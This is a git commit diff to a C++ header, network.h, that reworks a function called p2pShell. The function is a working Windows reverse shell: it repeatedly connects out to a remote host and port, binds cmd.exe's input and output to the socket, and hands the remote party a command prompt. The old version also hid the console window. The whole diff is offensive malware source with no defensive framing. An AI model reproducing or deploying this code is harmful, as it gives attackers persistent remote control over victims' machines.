b70ac137a29ea21f643b44cd89c4dd35e5400f57
manjoos <71747405+0xmanjoos@users.noreply.github.com>
2021-02-11 22:22:46 -0800

    Update network.h

--- network.h
+++ network.h
@@ -1,59 +1,51 @@
 #pragma once
 #define _WIN32_WINNT 0x501
 #include "includes.h"
-// -lws2_32 || -lwsock32
 
 void p2pShell(const char* remoteAddr, int remotePort) {
-    FreeConsole();
-    SOCKET lsock;
-    sockaddr_in addr;
-    WSAData version;
-    WSAStartup(MAKEWORD(2, 2), &version);
-    lsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
-    addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = inet_addr(remoteAddr);
-    addr.sin_port = htons(remotePort);
-
-    struct hostent *hp = gethostbyname(remoteAddr);
-    if (hp==NULL) {
-        VK_RETURN;
-    }
-    int i=0;
-    while ( hp->h_addr_list[i] != 0 ) {
-        addr.sin_addr.s_addr = *(u_long *) hp->h_addr_list[i++];
-    }
-    while (true) {
+    while (1) {
+        SOCKET lsock;
+        sockaddr_in addr;
+        WSAData version;
+        WSAStartup(MAKEWORD(2, 2), &version);
+        lsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+        struct hostent *hp = gethostbyname(remoteAddr);
+        if (hp==NULL) {
+            continue;
+        }
+        int i=0;
+        while ( hp->h_addr_list[i] != 0 ) {
+            addr.sin_addr.s_addr = *(u_long *) hp->h_addr_list[i++];
+        }
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = inet_addr(remoteAddr);
+        addr.sin_port = htons(remotePort);
         if (WSAConnect(lsock, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
-            closesocket(lsock);
-            WSACleanup();
-            return;
+            cout<<"Sleeping!";
+            Sleep(TIMELEN);
+            continue;
         } else {
             char recvData[BUFFER];
             ZeroMemory(&recvData, sizeof(recvData));
             int recvStat = recv(lsock, recvData, BUFFER, 0);
-            if (recvData <= 0) {
+
+            char proc[] = "C:\\Windows\\system32\\cmd.exe";
+            STARTUPINFO sInfo;
+            PROCESS_INFORMATION pInfo;
+            ZeroMemory(&sInfo, sizeof(sInfo));
+            sInfo.cb = sizeof(sInfo);
+            sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)lsock;
+            CreateProcessA(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
+            WaitForSingleObject(pInfo.hProcess, INFINITE);
+            CloseHandle(pInfo.hProcess);
+            CloseHandle(pInfo.hThread);
+            ZeroMemory(&recvData, sizeof(recvData));
+            int recvCode = recv(lsock, recvData, BUFFER, 0);
+            if (recvCode <= 0) {
                 closesocket(lsock);
                 WSACleanup();
                 continue;
-            } else {
-                char proc[] = "C:\\Windows\\system32\\cmd.exe";
-                STARTUPINFO sInfo;
-                PROCESS_INFORMATION pInfo;
-                ZeroMemory(&sInfo, sizeof(sInfo));
-                sInfo.cb = sizeof(sInfo);
-                sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)lsock;
-                CreateProcessA(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
-                WaitForSingleObject(pInfo.hProcess, INFINITE);
-                CloseHandle(pInfo.hProcess);
-                CloseHandle(pInfo.hThread);
-                ZeroMemory(&recvData, sizeof(recvData));
-                int recvCode = recv(lsock, recvData, BUFFER, 0);
-                if (recvCode <= 0) {
-                    closesocket(lsock);
-                    WSACleanup();
-                    return;
-                }
             }
         }
     }
